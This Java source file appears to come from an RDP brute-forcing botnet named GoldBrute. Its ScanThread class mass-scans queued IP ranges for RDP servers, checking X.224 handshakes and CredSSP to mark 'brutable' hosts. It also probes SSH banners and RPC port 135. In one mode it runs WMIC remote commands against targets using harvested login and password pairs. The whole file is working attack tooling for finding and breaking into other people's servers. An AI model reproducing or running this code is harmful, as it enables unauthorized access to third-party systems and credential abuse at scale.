package rdp.gold.brute.pool;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Queue;
import java.util.Scanner;
import java.util.UUID;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;

import org.apache.log4j.Logger;

import rdp.gold.brute.Config;
import rdp.gold.brute.CounterPool;
import rdp.gold.brute.ResultStorage;
import rdp.gold.brute.entity.Host;
import rdp.gold.brute.entity.RDPEntity;
import rdp.gold.brute.rdp.ByteBuffer;
import rdp.gold.brute.rdp.Messages.ClientTpkt;
import rdp.gold.brute.rdp.Messages.ClientX224ConnectionRequestPDU;
import rdp.gold.brute.rdp.Messages.ServerTpkt;
import rdp.gold.brute.rdp.Messages.ServerX224ConnectionConfirmPDU;

@SuppressWarnings({ "unchecked", "rawtypes", "unused" })
public class ScanThread implements Runnable {
    public static final byte[] REQUEST_PKT = { 3, 0, 0, 51, 46, -32, 0, 0, 0, 0, 0, 67, 111, 111, 107, 105, 101, 58, 32, 109, 115, 116, 115, 104, 97, 115, 104, 61, 65, 100, 109, 105, 110, 105, 115,
            116, 114, 97, 116, 111, 114, 13, 10, 1, 0, 8, 0, 1, 0, 0, 0 };
    private static final Logger logger = Logger.getLogger(ScanThread.class);
    public static Queue<String> resultQueue = new ConcurrentLinkedQueue();
    private String host;
    private String ip;
    private String port;
    private Boolean useCounterResults = Boolean.valueOf(false);
    private Boolean isSaveHost = Boolean.valueOf(false);
    private UUID bruteId = Config.PROJECT_ID;
    private RDPEntity rdpEntity;

    public static List<Integer> getPorts(String port) throws Exception {
        try {
            List<Integer> ports = new ArrayList();

            String[] portList = port.split(",");
            if (portList.length > 1) {
                for (String portItem : portList) {
                    ports.add(Integer.valueOf(Integer.parseInt(portItem)));
                }
            } else {
                String[] portRange = port.split("-");
                if (portRange.length > 1) {
                    int startPort = Integer.parseInt(portRange[0]);
                    int endPort = Integer.parseInt(portRange[1]);
                    for (int i = startPort; i <= endPort; i++) {
                        ports.add(new Integer(i));
                    }
                } else {
                    ports.add(Integer.valueOf(Integer.parseInt(port)));
                }
            }
            return ports;
        } catch (Exception e) {
            throw new Exception("Not resolve ports; " + port + "; " + e);
        }
    }

    public static boolean scan(String host, int port) {
        return scan(host, port, Config.SCAN_SOCKET_TIMEOUT.intValue(), Config.SCAN_CONNECT_TIMEOUT.intValue());
    }

    public static boolean scan(String host, int port, int timeoutSocket, int timeoutConnect) {
        Socket s = null;
        OutputStream os = null;
        InputStream is = null;
        try {
            s = new Socket();
            s.setSoTimeout(timeoutSocket);
            s.connect(new InetSocketAddress(host, port), timeoutConnect);

            os = s.getOutputStream();
            is = s.getInputStream();

            ClientTpkt clientTpkt = new ClientTpkt();
            ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU("Almaz", 2);

            ByteBuffer bufferReq = clientX224ConnectionRequestPDU.proccessPacket(null);
            clientTpkt.proccessPacket(bufferReq);
            bufferReq.rewindCursor();

            os.write(bufferReq.data, bufferReq.offset, bufferReq.length);
            os.flush();

            ByteBuffer bufferRes = new ByteBuffer(-1);
            int actualLength = is.read(bufferRes.data, bufferRes.offset, bufferRes.data.length - bufferRes.offset);
            if (actualLength <= 0) {
                throw new Exception("INFO: End of stream or empty buffer is read from stream.");
            }
            bufferRes.length = actualLength;
            bufferRes.rewindCursor();
            bufferRes.ref();

            ServerTpkt serverTpkt = new ServerTpkt();
            bufferRes = serverTpkt.proccessPacket(bufferRes);

            ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
            serverX224ConnectionConfirmPDU.proccessPacket(bufferRes);

            return true;
        } catch (Exception localException) {
        } finally {
            try {
                if (s != null) {
                    s.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
        }
        return false;
    }

    public static boolean sniffRpc(String host, int port) {
        return sniffRpc(host, port, Config.SCAN_SOCKET_TIMEOUT.intValue(), Config.SCAN_CONNECT_TIMEOUT.intValue());
    }

    public static boolean sniffRpc(String host, int port, int timeoutSocket, int timeoutConnect) {
        Socket s = null;
        OutputStream os = null;
        InputStream is = null;
        try {
            s = new Socket();
            s.setSoTimeout(timeoutSocket);
            s.connect(new InetSocketAddress(host, 135), timeoutConnect);

            return true;
        } catch (Exception localException1) {
        } finally {
            try {
                if (s != null) {
                    s.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
        }
        return false;
    }

    public static boolean hasBrutable(String host, int port) {
        for (int i = 1; i <= Config.SCAN_CNT_ATTEMPTS.intValue(); i++) {
            if (hasOpenPort(host, port, Config.SCAN_SOCKET_TIMEOUT.intValue(), Config.SCAN_CONNECT_TIMEOUT.intValue())) {
                BruteThread bruteThread = new BruteThread();
                if (bruteThread.isCredSsp(host, port)) {
                    return true;
                }
            }
        }
        return false;
    }

    public static boolean hasOpenPort(String host, int port, int timeoutSocket, int timeoutConnect) {
        Socket s = null;
        OutputStream os = null;
        InputStream is = null;
        try {
            s = new Socket();
            s.setSoTimeout(timeoutSocket);
            s.connect(new InetSocketAddress(host, port), timeoutConnect);

            return true;
        } catch (Exception localException1) {
        } finally {
            try {
                if (s != null) {
                    s.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
        }
        return false;
    }

    public static boolean scanSSH(String host, int port) {
        return scanSSH(host, port, Config.SCAN_SOCKET_TIMEOUT.intValue(), Config.SCAN_CONNECT_TIMEOUT.intValue());
    }

    private static boolean scanSSH(String host, int port, int timeoutSocket, int timeoutConnect) {
        Socket s = null;
        OutputStream os = null;
        InputStream is = null;
        try {
            s = new Socket();
            s.setSoTimeout(timeoutSocket);
            s.connect(new InetSocketAddress(host, port), timeoutConnect);

            os = s.getOutputStream();
            is = s.getInputStream();

            ByteBuffer buffer = new ByteBuffer(-1);
            int actualLength = is.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
            buffer.length = actualLength;
            buffer.rewindCursor();

            boolean isSSH = buffer.dump().toLowerCase().contains("ssh");
            if (isSSH) {
                logger.info("Sniffed brute.ssh service in " + host + ":" + 3389);
            } else {
                logger.info("Not found brute.ssh service in " + host + ":" + 3389);
            }
            return isSSH;
        } catch (Exception e) {
            logger.error(e);
        } finally {
            try {
                if (s != null) {
                    s.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
            try {
                if (os != null) {
                    os.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
            try {
                if (is != null) {
                    is.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
        }
        return false;
    }

    public static boolean scanTelnet(String host, int port, RDPEntity rdpEntity) {
        return scanTelnet(host, port, Config.SCAN_SOCKET_TIMEOUT.intValue(), Config.SCAN_CONNECT_TIMEOUT.intValue(), rdpEntity);
    }

    private static boolean scanTelnet(String host, int port, int timeoutSocket, int timeoutConnect, RDPEntity rdpEntity) {
        Socket s = null;
        OutputStream os = null;
        InputStream is = null;
        try {
            s = new Socket();
            s.setSoTimeout(timeoutSocket);
            s.connect(new InetSocketAddress(host, port), timeoutConnect);

            ResultStorage.saveLogAny("Connected " + host + ":" + port + "   " + timeoutSocket + "  " + timeoutConnect + "   " + rdpEntity, ScanThread.class);
            if (rdpEntity != null) {
                try {
                    Runtime rt = Runtime.getRuntime();
                    String cmd = "cmd /c WMIC /node:" + rdpEntity.getIp() + " /user:\"" + rdpEntity.getLogin() + "\" /password:\"" + rdpEntity.getPassword() + "\" OS get name";

                    ResultStorage.saveLogAny("Run " + cmd, ScanThread.class);
                    System.out.println("Run " + cmd);

                    Process pr = rt.exec(cmd);

                    BufferedReader input = new BufferedReader(new InputStreamReader(pr.getInputStream()));
                    BufferedReader error = new BufferedReader(new InputStreamReader(pr.getErrorStream()));

                    String line = null;

                    StringBuilder stringBuilder = new StringBuilder();
                    while ((line = input.readLine()) != null) {
                        System.out.println(line);
                        stringBuilder.append(line);
                        stringBuilder.append("\r\n");
                    }
                    while ((line = error.readLine()) != null) {
                        System.out.println(line);
                        stringBuilder.append(line);
                        stringBuilder.append("\r\n");
                    }
                    ResultStorage.saveLogAny(stringBuilder.toString(), ScanThread.class);

                    pr.destroy();
                } catch (Exception e) {
                    ResultStorage.saveLogAny(e.toString(), ScanThread.class);
                    System.out.println(e.toString());
                    e.printStackTrace();
                }
            }
            ResultStorage.saveLogAny("wmic connected", ScanThread.class);

            return true;
        } catch (Exception e) {
            logger.error(host + ":" + port + "___" + e.getMessage());
            logger.error(e);

            ResultStorage.saveLogAny(host + ":" + port + "___" + e.getMessage(), ScanThread.class);
        } finally {
            try {
                if (s != null) {
                    s.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
            try {
                if (os != null) {
                    os.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
            try {
                if (is != null) {
                    is.close();
                }
            } catch (IOException e) {
                logger.error(e);
            }
        }
        return false;
    }

    public void run() {
        try {
            String host = null;
            for (;;) {
                if ((!this.bruteId.equals(Config.PROJECT_ID)) || (!Config.IS_ENABLED_SCAN.get())) {
                    return;
                }
                boolean isRun = false;
                try {
                    host = (String) GoldBrute.getTaskScanQueue().poll();
                    if (host != null) {
                        parseHost(host);
                        isRun = true;

                        CounterPool.poolUsed.incrementAndGet();
                        for (Integer portScan : getPorts()) {
                            boolean isValid = false;
                            for (int i = 1; i <= Config.SCAN_CNT_ATTEMPTS.intValue(); i++) {
                                if (Config.SCAN_TYPE.intValue() == 1) {
                                    if (scan(this.ip, portScan.intValue())) {
                                        isValid = true;

                                        CounterPool.scannedPorts.incrementAndGet();
                                        CounterPool.countX224RDP.incrementAndGet();
                                        if (Config.SCAN_IS_BRUTABLE.booleanValue()) {
                                            BruteThread bruteThread = new BruteThread();
                                            isValid = bruteThread.isCredSsp(this.ip, portScan.intValue());
                                            if (isValid) {
                                                CounterPool.countCredSSPRDP.incrementAndGet();
                                            }
                                        }
                                        if (!isValid) {
                                            break;
                                        }
                                        String saveSuccess = this.ip + ":" + portScan;
                                        if (!this.useCounterResults.booleanValue()) {
                                            ResultStorage.saveSuccess(saveSuccess);
                                        } else {
                                            resultQueue.add(saveSuccess);
                                        }
                                        break;
                                    }
                                } else if (Config.SCAN_TYPE.intValue() == 2) {
                                    if (scanSSH(this.ip, portScan.intValue())) {
                                        CounterPool.scannedPorts.incrementAndGet();

                                        String saveSuccess = this.ip + ":" + portScan;
                                        if (!this.useCounterResults.booleanValue()) {
                                            ResultStorage.saveSuccess(saveSuccess);
                                            break;
                                        }
                                        resultQueue.add(saveSuccess);

                                        break;
                                    }
                                } else if ((Config.SCAN_TYPE.intValue() == 3) && (scanTelnet(this.ip, portScan.intValue(), this.rdpEntity))) {
                                    isValid = true;

                                    CounterPool.scannedPorts.incrementAndGet();
                                    if (!isValid) {
                                        break;
                                    }
                                    String saveSuccess = this.ip + ":" + portScan;
                                    if (!this.useCounterResults.booleanValue()) {
                                        ResultStorage.saveSuccess(saveSuccess);
                                    } else {
                                        resultQueue.add(saveSuccess);
                                    }
                                    break;
                                }
                            }
                            if ((!this.useCounterResults.booleanValue()) && (!isValid) && (Config.SCAN_SAVE_INVALID.booleanValue())) {
                                String saveInvalid = this.ip + ":" + portScan;
                                ResultStorage.saveInvalid(saveInvalid);
                            }
                        }
                        if (!this.useCounterResults.booleanValue()) {
                            CounterPool.scannedIps.incrementAndGet();
                        }
                    }
                } catch (Exception e) {
                    StringWriter sw = new StringWriter();
                    e.printStackTrace(new PrintWriter(sw));

                    logger.error(e.getMessage() + sw.toString());
                } finally {
                    if (isRun) {
                        CounterPool.poolUsed.decrementAndGet();
                    }
                }
                if (host == null) {
                    try {
                        Thread.sleep(200L);
                    } catch (InterruptedException localInterruptedException1) {
                    }
                }
            }
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));

            logger.error(e.getMessage() + sw.toString());
        }
    }

    public List<Integer> getPorts() throws Exception {
        return getPorts(this.port);
    }

    @SuppressWarnings("resource")
    private void parseHost(String host) throws Exception {
        try {
            Matcher matcherIp = Config.PATTERN_IP_PORT.matcher(host);

            this.host = host;

            this.rdpEntity = null;
            if (matcherIp.find()) {
                Scanner scanner = new Scanner(host).useDelimiter(";");
                Scanner scannerHost = new Scanner(scanner.next()).useDelimiter(":");

                this.ip = scannerHost.next();
                this.port = new Integer(scannerHost.nextInt()).toString();
                if (scanner.hasNext()) {
                    this.rdpEntity = RDPEntity.parseRDPEntity(host);
                }
                this.isSaveHost = Boolean.valueOf(true);
            } else {
                this.ip = host;
                this.port = Config.PORT_SCAN;
            }
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            logger.error(e.getMessage() + sw.toString());

            throw e;
        }
    }

    @SuppressWarnings("resource")
    private static List<Host> runRpcScan() {
        try {
            final Queue<Host> scannedHosts = new ConcurrentLinkedQueue();

            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream("C:\\Users\\Terrorist\\Desktop\\scan_10.06.2019.txt"), "UTF-8"));

            List<String> ipList = new ArrayList();
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();

                ipList.add(line);
            }
            Queue<String> ipQueue = new ConcurrentLinkedQueue();
            ipQueue.addAll(ipList);

            ThreadGroup threadScanGroup = new ThreadGroup("workers_pdu");

            ExecutorService executors = Executors.newCachedThreadPool(new ThreadFactory() {
                public Thread newThread(Runnable r) {
                    return new Thread(threadScanGroup, r);
                }
            });
            final AtomicInteger checkedCount = new AtomicInteger();
            try {
                for (;;) {
                    int pushLimit = Config.SCAN_THREADS.intValue() - ((ThreadPoolExecutor) executors).getActiveCount();
                    while (pushLimit > 0) {
                        String ipPort = (String) ipQueue.poll();
                        if (ipPort == null) {
                            break;
                        }
                        Host host = new Host();
                        host.setIp(ipPort.split(":")[0]);
                        host.setPort(Integer.parseInt(ipPort.split(":")[1]));

                        executors.submit(new Runnable() {
                            public void run() {
                                if (ScanThread.sniffRpc(host.getIp(), host.getPort())) {
                                    scannedHosts.add(host);

                                    ResultStorage.saveSuccess(host.getIp() + ":" + host.getPort());
                                    System.out.println(host);
                                }
                                checkedCount.incrementAndGet();
                            }
                        });
                        pushLimit--;
                    }
                    int activeThreads = ((ThreadPoolExecutor) executors).getActiveCount();
                    int queueSize = ipQueue.size();

                    logger.info("Pool check rpc size is now " + activeThreads + ", rpc count " + scannedHosts.size() + ", pool " + queueSize + ", checked count " + checkedCount.get());
                    if (queueSize == 0) {
                        break;
                    }
                    Thread.sleep(1000L);
                }
            } catch (Exception e) {
                logger.error("Error threads", e);
            } finally {
                executors.shutdown();
            }
            List<Host> rpcList = new ArrayList();
            rpcList.addAll(scannedHosts);

            return rpcList;
        } catch (Exception e) {
            logger.error(e);
        }
        return new ArrayList();
    }

    public static void main(String[] argc) throws Exception {
        RDPEntity rdpEntity = RDPEntity.parseRDPEntity("");

        System.out.println(scanTelnet("", 3389, rdpEntity));
    }
}
